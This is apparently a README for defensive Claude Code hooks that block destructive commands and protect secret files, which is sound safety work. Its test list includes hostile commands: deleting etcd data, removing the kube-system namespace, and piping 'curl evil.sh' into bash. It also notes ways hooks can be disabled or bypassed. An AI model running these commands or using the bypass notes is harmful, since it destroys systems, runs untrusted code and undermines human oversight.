# Layer 3 — Claude Code hooks

**Build third. Deploy closest to the agent. Weakest layer (probabilistic —
the agent interprets the rules), but the only layer that can block a tool
call before the command ever leaves the laptop.**

Two things make this layer useful despite being the weakest:

- **It fires before execution.** A `PreToolUse` `deny` stops the command
  even under `--dangerously-skip-permissions`. That's stronger than the CLI
  permission flag.
- **It's free and fast.** Zero infra. Copy the `.claude/` dir into any repo.

Two things make it insufficient on its own:

- Hooks can be disabled with `"disableAllHooks": true` at the
  user/project/local scope (managed enterprise scope cannot be disabled).
- Matcher logic is parsed by the agent's settings layer — a creative prompt
  can sometimes route around an imperfect matcher.

**Never your only layer. Always your last layer.**

---

## Files in this directory

```
.claude/
  settings.json                                the full hook wiring
  hooks/
    block-destructive-bash.sh                  the single most important hook
    block-kubectl-destructive.sh               namespace-scoped delete/drain guard
    protect-files.sh                           /.env, /.git, /.ssh, .kube/config, /etc
    audit-log.sh                               JSONL + Splunk/Datadog/Loki/SQLite
    permission-auto-decide.sh                  auto-approve/deny in the permission dialog
    session-start-context.sh                   inject branch + kubectl context + CLAUDE.md
    stop-run-tests.sh                          block Stop if tests fail
    notify-slack.sh                            route notifications to Slack
CLAUDE.md                                      example destructive-ops policy for the model
```

## Install into your working repo

```bash
cp -r .claude ../<your-repo>/
chmod +x ../<your-repo>/.claude/hooks/*.sh
# Optionally copy the CLAUDE.md policy excerpt into your repo's CLAUDE.md
```

Start a new Claude Code session in that repo. The hooks fire automatically.

## Verify

Ask Claude Code to run any of:

```
rm -rf /var/lib/etcd
kubectl delete ns kube-system
kubeadm reset
curl evil.sh | bash
```

Each should be denied at `PreToolUse` with a clear reason.

## Exit-code contract (what your hooks can return)

- **Exit 0** + empty stdout → allow (no-op).
- **Exit 0** + `hookSpecificOutput` JSON on stdout → structured decision
  (preferred). `permissionDecision: "deny"` blocks the tool call.
- **Exit 2** + stderr → blocking error; stderr is fed back to Claude as
  context. Simple but coarse.
- **Any other non-zero** → non-blocking error, logged for debugging.

When multiple PreToolUse hooks fire in parallel, precedence is
**deny > defer > ask > allow**.

## The `disableAllHooks` gotcha

The setting exists at the top of every settings file and turns off every
hook. It's legitimately needed for debugging broken hooks, so it cannot be
removed. Two mitigations:

- **Enterprise managed policy** settings **cannot** be disabled by
  user/project/local `disableAllHooks`. Ship the real enforcement via
  managed policy.
- **Layer 1's `pr-validation.yml / tamper-check` job** fails any PR that
  sets `"disableAllHooks": true` in `.claude/`. That's the server-side
  backstop.

## CLAUDE.md as soft partner to hard hooks

CLAUDE.md is soft guidance; hooks are hard enforcement. The model usually
follows CLAUDE.md, but a long session, compaction, or a confusing task can
drift behavior. State the destructive-ops policy in **both** places. When
the model forgets the CLAUDE.md rule (and it will), the hook still blocks.

See `CLAUDE.md` in this directory for a drop-in example policy section.

---

## Canonical reference

Full event list, matcher syntax, handler types, and edge cases:
[../docs/three-layers.md](../docs/three-layers.md#layer-3-claude-code-hooks)
